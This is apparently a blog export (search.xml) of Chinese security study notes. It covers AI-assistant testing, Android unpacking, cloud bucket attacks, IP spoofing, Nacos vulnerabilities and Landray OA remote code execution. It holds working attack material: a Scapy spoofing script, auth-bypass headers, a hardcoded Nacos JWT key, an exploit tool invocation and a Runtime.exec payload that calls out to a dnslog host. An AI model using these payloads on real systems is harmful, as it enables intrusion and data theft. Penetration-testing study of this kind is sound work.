<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于ai助手的测试</title>
    <url>/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="1-测试方案"><a href="#1-测试方案" class="headerlink" title="1-测试方案"></a>1-测试方案</h1><p><code>把ai当成用户进行测试</code></p>
<p>1-越权(通过ai助手可获得非本用户权限的数据)</p>
<p>2-<code>xss</code>(ai返回的数据会导致xss，本用户发过去的数据会导致xss)</p>
<p>3-泄露敏感信息(三要素)</p>
<p><code>待续</code></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>next学习规划</title>
    <url>/2026/01/30/next%E5%AD%A6%E4%B9%A0%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>经过面试学到了如下需要深入学习的技术和扩展的方面，简单记录如下：</p>
<p>1-frida的使用（动态 dump dex）	–⑤</p>
<p>2-oss存储桶漏洞相关利用</p>
<p>3-SpringBlade微服务框架</p>
<p>4-反序列化框架的学习（未手动找到过这种漏洞，被动扫描出一次，特征：参数为object）</p>
<p>5-双向认证(mTLS)		–①</p>
<span id="more"></span>

<h1 id="1-frida的去壳"><a href="#1-frida的去壳" class="headerlink" title="1-frida的去壳"></a>1-frida的去壳</h1><p><strong><code>前言</code></strong></p>
<p><code>开发环境下的app一般属于无需去壳的，生产环境的app大多加固混淆以及反调试，UAT环境应该是用来保护证书的</code></p>
<p><code>所以要学习去壳从而可以删除里面的反调试之类的代码，然后重打包App，进而可以用objection进行排查类找到hook点</code></p>
<p>学习文章：</p>
<p><a href="https://www.anquanke.com/post/id/197657#h3-12">实用FRIDA进阶：内存漫游、hook anywhere、抓包-安全KER - 安全资讯平台</a></p>
<p><a href="https://juejin.cn/post/6962096676576165918">Android脱壳之整体脱壳原理与实践这里所说的壳都是指dex加壳,不涉及到so的加壳。 涉及到的代码分析基于AOSP - 掘金</a></p>
<p><strong>地狱笑话</strong>：<code>IDA 是尸检||Frida 是活体解剖</code></p>
<h2 id="Frida-动态-dump-dex"><a href="#Frida-动态-dump-dex" class="headerlink" title="Frida 动态 dump dex"></a><strong>Frida 动态 dump dex</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#应对的壳如下：</span><br><span class="line">Java 壳</span><br><span class="line">延迟加载 dex</span><br><span class="line">商业壳 / 自研壳</span><br></pre></td></tr></table></figure>

<p>Hook dex 加载函数，把内存里的 dex dump 出来</p>
<p><code>待续</code></p>
<h2 id="内存加载壳"><a href="#内存加载壳" class="headerlink" title="内存加载壳"></a><strong>内存加载壳</strong></h2><p>特征：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/app/ 下找不到 dex</span><br><span class="line">DexClassLoader 的路径是假的</span><br><span class="line">dex 在内存 buffer 里</span><br><span class="line">dex\n035\0</span><br></pre></td></tr></table></figure>

<p><code>待续</code></p>
<h2 id="Application-切换壳"><a href="#Application-切换壳" class="headerlink" title="Application 切换壳"></a>Application 切换壳</h2><p><code>待记录</code></p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p><strong>去壳后需要</strong><br>重打包 APK、 校验 dex 完整性、再 Hook</p>
<h1 id="2-oss存储桶"><a href="#2-oss存储桶" class="headerlink" title="2-oss存储桶"></a>2-oss存储桶</h1><p><a href="https://www.freebuf.com/articles/others-articles/356583.html">对象存储(OSS)攻防案例 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://rivers.chaitin.cn/blog/cqq591h0lnec5jjugje0">【云安全】阿里云 OSS对象存储攻防 | 长亭百川云</a></p>
<p>①-Object 遍历②-Bucket 桶爆破③-特定的 Bucket 策略配置④任意文件上传与覆盖⑤Bucket 接管⑥Bucket 可修改</p>
<h2 id="AccessKey-SecretKey-AK-SK-泄露"><a href="#AccessKey-SecretKey-AK-SK-泄露" class="headerlink" title="AccessKey/SecretKey (AK/SK)泄露"></a><code>AccessKey/SecretKey (AK/SK)</code>泄露</h2><p>前端<code>js</code>泄露，或者后端接口<code>env</code>，<code>onfig.ini</code>等配置文件未授权访问</p>
<p>该<code>re</code>取自<a href="https://www.freebuf.com/articles/web/408022.html">记一次AccessKey值泄露的挖掘和分析 - FreeBuf网络安全行业门户</a></p>
<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps <span class="type">AIza</span>|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|<span class="type">AWSSecretKey</span>|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-<span class="number">9_</span> .\-,]&#123;<span class="number">0</span>,<span class="number">25</span>&#125;)(=|&gt;|:=|\|\|:|&lt;=|=&gt;|:).&#123;<span class="number">0</span>,<span class="number">5</span>&#125;[<span class="string">&#x27;\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[&#x27;</span>\<span class="string">&quot;]</span></span><br></pre></td></tr></table></figure>

<h2 id="访问失败回显特定值"><a href="#访问失败回显特定值" class="headerlink" title="访问失败回显特定值"></a>访问失败回显特定值</h2><h3 id="回显-AccessDenied"><a href="#回显-AccessDenied" class="headerlink" title="回显 AccessDenied"></a>回显 <code>AccessDenied</code></h3><p>​	(403 Forbidden)– 名称有效</p>
<p>​	尝试使用aliyun的cli获取policy	—<strong>特定的Bucket策略配置（例如：<code>ua=xxx</code>可以访问）</strong></p>
<h3 id="回显-NoSuchBucket"><a href="#回显-NoSuchBucket" class="headerlink" title="回显 NoSuchBucket"></a>回显 <code>NoSuchBucket</code></h3><p>​	–(404 Not Found)</p>
<p>​	**<code>	InvalidBucketName</code>**：表示存储桶的名称不符合规范，属于无效的存储桶名称。</p>
<p>​	**<code>NoSuchBucket</code>**：表示没有这个存储桶。</p>
<p>​	–存储桶接管 (Bucket Takeover)，注册同名 Bucket，从而向原应用注入恶意文件</p>
<p>​	–Bucket 名称爆破	如果没有禁用“公共读”权限，猜中文件名，就能直接下载文件</p>
<h3 id="回显-ListBucket-结果"><a href="#回显-ListBucket-结果" class="headerlink" title="回显 ListBucket 结果"></a>回显 <code>ListBucket</code> 结果</h3><pre><code> (200 OK)--无参数认证则为未授权读
</code></pre>
<h3 id="回显-access-denied-by-bucket-policy"><a href="#回显-access-denied-by-bucket-policy" class="headerlink" title="回显 access denied by bucket policy"></a>回显 <code>access denied by bucket policy</code></h3><p>​	—-<strong>Bucket 策略配置可写</strong>   (PUT方法上传)</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><code>ossutil</code> 等官方工具</p>
<p>待续</p>
<h1 id="3-SpringBlade微服务框架"><a href="#3-SpringBlade微服务框架" class="headerlink" title="3-SpringBlade微服务框架"></a>3-SpringBlade微服务框架</h1><p>学习文章：</p>
<p><a href="https://github.com/chillzhuang/SpringBlade">SpringBlade源码</a></p>
<p><a href="https://www.freebuf.com/vuls/413556.html">浅识springblade框架漏洞 - FreeBuf网络安全行业门户</a></p>
<p>fofa指纹：<code>icon_hash=&quot;1047841028&quot;</code>（长得像MC的mod铁剑）</p>
<p><code>OWTOP</code>漏洞，值得注意的是：默认jwt密钥</p>
<h1 id="4-反序列化框架的学习"><a href="#4-反序列化框架的学习" class="headerlink" title="4-反序列化框架的学习"></a>4-反序列化框架的学习</h1><p>学习文章：<br><a href="https://www.freebuf.com/articles/web/276624.html">常见的Web漏洞——反序列化漏洞 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/Libra1313/article/details/146106367">【2025】最新反序列化漏洞汇总，从零基础到精通，收藏这篇就够了！_反序列化漏洞有哪些-CSDN博客</a></p>
<h2 id="常见反序列化框架"><a href="#常见反序列化框架" class="headerlink" title="常见反序列化框架"></a>常见反序列化框架</h2><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a><strong>PHP反序列化漏洞</strong></h3><p>PHP中通常使用<code>serialize</code>函数进行序列化，使用<code>unserialize</code>函数进行反序列化</p>
<p><a href="https://xz.aliyun.com/news/16664">PHP反序列化总结（POP链）-先知社区</a></p>
<h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>Java中通常使用<code>Java.io.ObjectOutputStream</code>类中的<code>writeObject</code>方法进行序列化，<a href="https://xz.aliyun.com/news/1744">Java反序列化漏洞从入门到深入-先知社区</a></p>
<h3 id="ASP-NET反序列化"><a href="#ASP-NET反序列化" class="headerlink" title="ASP.NET反序列化"></a>ASP.NET反序列化</h3><p>.NET框架包含多个序列化类，<code>BinaryFormatter</code>，<code>JavaScriptSerializer</code>，<code>XmlSerializer</code>，<code>DataContractSerializer</code></p>
<h3 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h3><p>Python提供的<code>pickle</code>模块可以序列化对象，反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上</p>
<h3 id="Node-js-反序列化"><a href="#Node-js-反序列化" class="headerlink" title="Node.js 反序列化"></a>Node.js 反序列化</h3><p><code>node-serialize</code> 在反序列化时使用了 <code>eval()</code>，直接执行传入的数据</p>
<h1 id="5-双向认证"><a href="#5-双向认证" class="headerlink" title="5-双向认证"></a>5-双向认证</h1><p>[<a href="https://bbs.kanxue.com/thread-280089-1.htm">原创] Frida解决证书绑定问题-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
<p><a href="https://www.freebuf.com/sectool/331471.html">Frida自吐证书密码 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.cthousand.cn/2025/02/15/%E5%AE%89%E5%8D%93%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87/">双向证书效验绕过</a></p>
<p><code>**网.apk</code>就是标准的双向认证，即便是做了uat认证，电脑也无法访问，只有流量走一遍app才能访问对应的网址接口</p>
<p>yakit可以做国密网址的测试，双向认证的话要找到对应的客户端证书</p>
<h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><p><strong><code>gmssl</code><strong>、<a href="https://curl.gmssl.cn/"><strong><code>gmcurl</code></strong></a>、</strong><code>yakit</code><strong>、</strong><code>r0capture</code><strong>、</strong><code>python</code></strong></p>
<p>r0capture导出的客户端证书默认路径在<code>/sdcard/Download/xx.p12</code>, 密码默认是<code>r0ysue</code></p>
<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -<span class="keyword">in</span> test.p12 -clcerts -nokeys -out <span class="number">1</span>.crt -legacy</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> test.p12 -nocerts -nodes -out <span class="number">1</span>.key -legacy</span><br><span class="line"></span><br><span class="line">gmssl tlcp_client -host <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -cert <span class="number">1</span>.crt -key <span class="number">1</span>.key -pass &#x27;MyP@ssw0rd!&#x27;</span><br><span class="line"></span><br><span class="line">gmcurl --gmssl -v --cacert ca.crt --cert <span class="number">1</span>.crt --key <span class="number">1</span>.key:你的密码 --cert2 <span class="number">1</span>.crt --key2 <span class="number">1</span>.key:你的密码 https://[目标URL]</span><br></pre></td></tr></table></figure>





<h1 id="其他；"><a href="#其他；" class="headerlink" title="其他；"></a>其他；</h1><p>可以多去面试看看在别人眼里的自己</p>
<p>但无论如何，那仅仅是别人眼中的自己</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>常见进程自启处理</title>
    <url>/2026/01/29/%E5%B8%B8%E8%A7%81%E8%BF%9B%E7%A8%8B%E8%87%AA%E5%90%AF/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h1><p>电脑弹出了两个广告，我一看小窗口，没有运行的第三方程序，我根据进程找了一下，发现一个是雷电模拟器的广告，一个是wps的广告，主要是wps的进程明明是手动启动的，但它还是每次自启了，顺便把云服务也带起来自启了，以下记录了完全关闭自启的几种方法，以后换电脑也能记得调。</p>
<span id="more"></span>

<h1 id="1-任务计划程序"><a href="#1-任务计划程序" class="headerlink" title="1.任务计划程序"></a>1.任务计划程序</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">taskschd.msc</span><br></pre></td></tr></table></figure>

<p><code>wps</code>它就有三个定时任务，简直难它天，我就说老关不掉</p>
<h1 id="2-服务"><a href="#2-服务" class="headerlink" title="2.服务"></a>2.服务</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">services.msc</span><br></pre></td></tr></table></figure>

<p>像雷电模拟器之类的就会在这里</p>
<h1 id="3-注册表（通用）"><a href="#3-注册表（通用）" class="headerlink" title="3.注册表（通用）"></a>3.注册表（通用）</h1><p>推荐工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">regedit</span><br></pre></td></tr></table></figure>

<p>上面两个方法一个关闭服务，一个关闭计划任务差不多可以了，但有些是dll这些进程在注册表里，只能采用注册表删除，建议用微软自己的工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a>来disable，防止删除了其他系统数据</p>
<p><code>TSVNCache.exe</code>等，常见<strong>注册表启动项</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>ip伪造分析</title>
    <url>/2026/01/19/ip%E4%BC%AA%E9%80%A0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚开始认为ip伪造只是简单的更改http请求里面的请求头，后面发现可以更改的地方还是比较多的，记录一下，目前学到的</p>
<p><strong>应用层(HTTP)</strong>  ：xff等ip请求头伪造					用于伪造ip</p>
<p><strong>网络层&#x2F;传输层</strong> ：IP 层伪造（Scapy 库构建）			用于反射 &#x2F; 放大攻击&#x2F;DDoS &#x2F; SYN Flood</p>
<p><strong>防御</strong>：采用TCP 握手的源 IP【该ip是内核给的】、在路由器上启用RPF检查</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>对比点</th>
<th>IP 层伪造（Scapy 那种）</th>
<th>XFF 伪造</th>
</tr>
</thead>
<tbody><tr>
<td>所在层级</td>
<td><strong>网络层 &#x2F; 传输层</strong></td>
<td><strong>应用层（HTTP）</strong></td>
</tr>
<tr>
<td>改的是什么</td>
<td>IP 包头里的 <code>src IP</code></td>
<td>HTTP Header</td>
</tr>
<tr>
<td>能否完成 TCP 握手</td>
<td>❌ 不能</td>
<td>✅ 能</td>
</tr>
<tr>
<td>服务器看到的 TCP IP</td>
<td>❌ 假的</td>
<td>✅ 真的</td>
</tr>
<tr>
<td>nginx <code>remote_addr</code></td>
<td>❌ 伪造值</td>
<td>✅ 真实值</td>
</tr>
<tr>
<td>能否正常访问接口</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>主要用途</td>
<td>DDoS &#x2F; 反射攻击</td>
<td>绕业务逻辑</td>
</tr>
<tr>
<td>安全价值</td>
<td>网络攻击</td>
<td>Web 漏洞利用</td>
</tr>
</tbody></table>
<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>这个就是抓包软件抓到然后改请求头就行了，常用的ip伪造请求头如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">Forwarded: 127.0.0.1</span><br><span class="line">X-Requested-With: 127.0.0.1</span><br><span class="line">X-Forwarded-Proto: 127.0.0.1</span><br><span class="line">X-Forwarded-Host: 127.0.0.1</span><br><span class="line">X-remote-IP: 127.0.0.1</span><br><span class="line">X-remote-addr: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP: 127.0.0.1</span><br><span class="line">Cdn-Src-Ip: 127.0.0.1</span><br><span class="line">Cdn-Real-Ip: 127.0.0.1</span><br><span class="line">CF-Connecting-IP: 127.0.0.1</span><br><span class="line">X-Cluster-Client-IP: 127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP: 127.0.0.1</span><br><span class="line">Proxy-Client-IP: 127.0.0.1</span><br><span class="line">Fastly-Client-Ip: 127.0.0.1</span><br><span class="line">True-Client-Ip: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="网络层-传输层"><a href="#网络层-传输层" class="headerlink" title="网络层&#x2F;传输层"></a>网络层&#x2F;传输层</h1><p><a href="https://blog.csdn.net/2302_82189125/article/details/139293229">使用 Scapy 库编写 IP 地址欺骗攻击脚本_scapy ip-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from scapy.layers.inet import TCP</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def non_blind_spoofing(target_ip, spoofed_ip, target_port, seq_num, ack_num):</span><br><span class="line">    packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=12345, dport=target_port, seq=seq_num, ack=ack_num, flags=&quot;PA&quot;) / b&quot;Non-blind spoofing attack&quot;</span><br><span class="line">    send(packet)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    target_ip = &quot;192.168.134.148&quot;  # 目标系统的IP地址</span><br><span class="line">    spoofed_ip = &quot;192.168.1.1&quot;   # 伪造的源IP地址</span><br><span class="line">    target_port = 80             # 目标系统开放的端口</span><br><span class="line">    seq_num = 1000               # 合法通信中捕获的序列号</span><br><span class="line">    ack_num = 1001               # 合法通信中捕获的确认号</span><br><span class="line">    non_blind_spoofing(target_ip, spoofed_ip, target_port, seq_num, ack_num)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos系统漏洞</title>
    <url>/2026/01/13/Nacos%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h1><p>知道泄露接口以及危险接口大致如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#文件上传</span><br><span class="line">/nacos/v1/cs/ops/data/removal</span><br><span class="line">#sql注入</span><br><span class="line">/nacos/v1/cs/ops/derby?sql=</span><br><span class="line">#获取nacos版本信息</span><br><span class="line">/nacos/v1/console/server/state</span><br><span class="line">#查看用户信息</span><br><span class="line">GET /nacos/v1/auth/users</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/h0ny/NacosExploit">Nacos综合利用工具</a></p>
<span id="more"></span>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#全选绕过的请求头</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Nacos-Server</span><br><span class="line"><span class="attribute">serverIdentity</span><span class="punctuation">: </span>security</span><br></pre></td></tr></table></figure>

<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><h2 id="默认硬编码"><a href="#默认硬编码" class="headerlink" title="默认硬编码"></a>默认硬编码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#默认jwt密钥0.1.0&lt;=nacos&lt;=2.2.0</span><br><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 </span><br><span class="line"># =后边的是默认的硬编码</span><br></pre></td></tr></table></figure>

<p>①<code>nacos</code>加密用户<code>accessToken</code>使用的<code>jwt</code>默认密钥加密，也就是只要知到<code>nacos</code>的用户，任何人都能通过此密钥加密用户得到对应用户的<code>accessToken</code></p>
<h2 id="Nacos-JRaft-Services-文件操作漏洞"><a href="#Nacos-JRaft-Services-文件操作漏洞" class="headerlink" title="Nacos JRaft Services 文件操作漏洞"></a>Nacos JRaft Services 文件操作漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#JRaft（Nacos 内置一致性组件）用于快照同步的接口</span><br><span class="line">/nacos/v1/raft/snapshot</span><br></pre></td></tr></table></figure>



<h2 id="Nacos-Hessian-反序列化漏洞"><a href="#Nacos-Hessian-反序列化漏洞" class="headerlink" title="Nacos Hessian 反序列化漏洞"></a>Nacos Hessian 反序列化漏洞</h2><ul>
<li>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6</li>
<li>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</li>
</ul>
<p>poc：<a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar NacosRce.jar http://xxxx:xxx/nacos/ <span class="number">7848</span> &quot;whoami&quot;</span><br></pre></td></tr></table></figure>















<h2 id="Nacos-Yaml反序列化漏洞"><a href="#Nacos-Yaml反序列化漏洞" class="headerlink" title="Nacos  Yaml反序列化漏洞"></a>Nacos  Yaml反序列化漏洞</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/cs/configs?import=true&amp;namespace=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx:xx</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data;boundary=----xxxx</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">xxx</span></span></span><br></pre></td></tr></table></figure>

<p>工具利用：<a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p>
<p>注意：</p>
<p><code>yaml-payload</code>中的Java文件是弹出计算机，可以更改成添加用户再进行打包；参考文章<a href="https://xz.aliyun.com/news/12906">内网打靶—春秋云镜篇(6) –Hospital-先知社区</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#准备恶意文件</span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line"></span><br><span class="line">jar -cvf yaml-payload.jar -C src/</span><br><span class="line">#windows</span><br><span class="line">jar -cvf yaml-payload.jar -C src .</span><br><span class="line"></span><br><span class="line">#找个可以出网的地方监听一般是内网</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>





<h2 id="Spring-Cloud-Gateway攻击Redis"><a href="#Spring-Cloud-Gateway攻击Redis" class="headerlink" title="Spring Cloud Gateway攻击Redis"></a>Spring Cloud Gateway攻击Redis</h2><p>① Nacos 版本 ≤ <strong>1.4.x</strong><br>② <code>/nacos/v1/cs/configs</code> <strong>可未授权写</strong><br>③ 下游是 <strong>Spring &#x2F; Spring Cloud 应用</strong><br>④ 应用开启了 <strong>自动刷新 &#x2F; 动态配置</strong></p>
<p>文章<a href="https://www.yulegeyu.com/2024/04/03/Spring-Cloud-Gateway%E6%94%BB%E5%87%BBRedis/">Spring Cloud Gateway攻击Redis | 雨了个雨’s blog</a></p>
<h3 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h3><p>在nacos中通过编辑路由配置文件，通过新增路由以及配置AddResponseHeader过滤器执行SPEL表达式实现RCE</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝凌OA远程RCE记录</title>
    <url>/2026/01/08/%E8%93%9D%E5%87%8COA%E8%BF%9C%E7%A8%8BRCE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h1><p>知道存在命令执行的接口大致如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">data/sys-common/treexml.tmpl</span><br><span class="line">sys/common/dataxml.jsp</span><br><span class="line">data/sys-common/datajson.js</span><br><span class="line">data/sys-common/treexml.js</span><br><span class="line">ekp/data/sys-common/dataxml.tmpl</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h1><p>目前基本都需要授权才能访问蓝凌OA的接口，未授权需要考虑存在<code>sysUiComponent</code> 接口的 <code>replaceExtend</code> 方法，把 <code>dataxml.jsp</code>后台命令执行漏洞转化为前台命令执行漏洞，详细原理以及操作可以参考<a href="https://le1a.github.io/article/ekp">蓝凌EKP 远程代码执行漏洞分析 | Le1a的菜园坝</a>，<a href="https://xz.aliyun.com/news/14443">某凌 EKP 前台远程命令执行漏洞分析-先知社区</a>的两个链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s_bean=sysFormulaSimulateByJS&amp;script=</span><br><span class="line">s_bean=sysFormulaValidate&amp;script=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#/data/sys-common/treexml.tmpl的post可能存在/ekp/data/sys-common/dataxml.tmpl</span><br><span class="line">s_bean=ruleFormulaValidate&amp;script=</span><br></pre></td></tr></table></figure>

<p><code>s_bean=sysFormulaSimulateByJS</code>是一个参数，它的作用是用于指定服务端要执行的一段 Java 代码。</p>
<p><a href="https://rofgd.github.io/2023/04/15/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90---%E8%93%9D%E5%87%8COA/">恶意代码分析—蓝凌OA - ReadPond的小屋</a></p>
<h3 id="常见的-s-bean-参数"><a href="#常见的-s-bean-参数" class="headerlink" title="常见的 s_bean 参数"></a>常见的 <code>s_bean</code> 参数</h3><table>
<thead>
<tr>
<th><code>s_bean</code> 值</th>
<th>用途 &#x2F; 说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>sysFormulaSimulateByJS</strong></td>
<td>前端公式模拟&#x2F;执行（通过 JS 脚本走公式引擎的模拟执行）</td>
</tr>
<tr>
<td><strong>sysFormuladata</strong> &#x2F; <strong>sysFormulaValidate</strong></td>
<td>用于触发表单公式验证逻辑（不是模拟执行，而是正式走后端公式校验）</td>
</tr>
<tr>
<td><strong>sysFormulaValidate</strong></td>
<td>推荐用于后端严格验证公式值（非模拟结果）</td>
</tr>
<tr>
<td><strong>sysFormularun</strong></td>
<td>可能用于触发后端执行公式生成&#x2F;计算数据（具体根据版本有所不同）</td>
</tr>
<tr>
<td><strong>sysMetaDataService</strong></td>
<td>有的版本中用于获取元数据&#x2F;字段定义等（可用于动态表单渲染）</td>
</tr>
<tr>
<td><strong>sysFormDataSave &#x2F; sysFormDataLoad</strong></td>
<td>表单数据保存或读取操作</td>
</tr>
<tr>
<td><strong>sysCheckData</strong></td>
<td>通用数据校验 Bean（用于触发系统级字段校验）</td>
</tr>
</tbody></table>
<p>dnslog探测（是否出网）：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">function test()&#123;return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(&quot;ping -c 4 uftj1t.dnslog.cn&quot;)&amp;type=1</span><br></pre></td></tr></table></figure>

